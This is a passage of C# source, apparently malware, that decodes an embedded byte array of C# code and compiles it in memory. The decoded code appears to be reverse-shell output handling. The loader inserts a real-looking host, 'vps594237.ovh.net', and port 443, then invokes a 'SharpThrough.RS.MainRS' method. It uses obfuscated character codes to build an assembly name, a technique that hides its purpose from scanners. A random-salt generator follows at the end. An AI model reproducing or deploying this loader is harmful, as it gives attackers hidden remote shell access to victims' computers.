0x67, 0x73, 0x20, 0x6F, 0x75, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x65, 0x72, 0x20, 0x73, 0x74, 0x72, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20, 0x3D, 0x20, 0x6E, 0x65, 0x77, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x65, 0x72, 0x28, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x69, 0x66, 0x20, 0x28, 0x21, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x2E, 0x49, 0x73, 0x4E, 0x75, 0x6C, 0x6C, 0x4F, 0x72, 0x45, 0x6D, 0x70, 0x74, 0x79, 0x28, 0x6F, 0x75, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x29, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x74, 0x72, 0x79, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x72, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x2E, 0x41, 0x70, 0x70, 0x65, 0x6E, 0x64, 0x28, 0x6F, 0x75, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x57, 0x72, 0x69, 0x74, 0x65, 0x72, 0x2E, 0x57, 0x72, 0x69, 0x74, 0x65, 0x4C, 0x69, 0x6E, 0x65, 0x28, 0x73, 0x74, 0x72, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x57, 0x72, 0x69, 0x74, 0x65, 0x72, 0x2E, 0x46, 0x6C, 0x75, 0x73, 0x68, 0x28, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x63, 0x61, 0x74, 0x63, 0x68, 0x20, 0x28, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x65, 0x72, 0x72, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0x7D };

            CompilerParameters compileParameters = new CompilerParameters();
            string currentDirectory = Directory.GetCurrentDirectory();
            compileParameters.GenerateInMemory = true;
            compileParameters.TreatWarningsAsErrors = false;
            compileParameters.GenerateExecutable = false;
            compileParameters.CompilerOptions = "/optimize";
            compileParameters.ReferencedAssemblies.Add("S" + (char)121 + "s" + (char)84 + "e" + "m" + (char)46 + (char)100 + (char)108 + (char)76);

            string code = Encoding.UTF8.GetString(byteRS);
            string ip =  "vps594237.ovh.net";
            string port = "443";

            code = code.Replace("|IPADDRESS|", ip );
            code = code.Replace("|TCPPORT|", port);

            CSharpCodeProvider cSharpCompiler = new CSharpCodeProvider();
            CompilerResults compileResults = cSharpCompiler.CompileAssemblyFromSource(compileParameters, code);

            if (compileResults.Errors.HasErrors)
            {
                string text = "comp errors : ";
                foreach (CompilerError compileError in compileResults.Errors)
                {
                    text += "rn " + compileError.ToString();
                }
            }

            Module module = compileResults.CompiledAssembly.GetModules()[0];
            Type type = null;
            MethodInfo methodInfo = null;
            if (module != null)
            {
                type = module.GetType("SharpThrough.RS");
            }
            if (type != null)
            {
                methodInfo = type.GetMethod("MainRS");
            }
            if (methodInfo != null)
            {
                methodInfo.Invoke(null, null);
            }
         }

        public static byte[] GenerateRandomSalt()
        {
            
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    // Fille the buffer with the generated data
                    rng.GetBytes(data);
                }
            }

            return data;
        }
              
    }
}

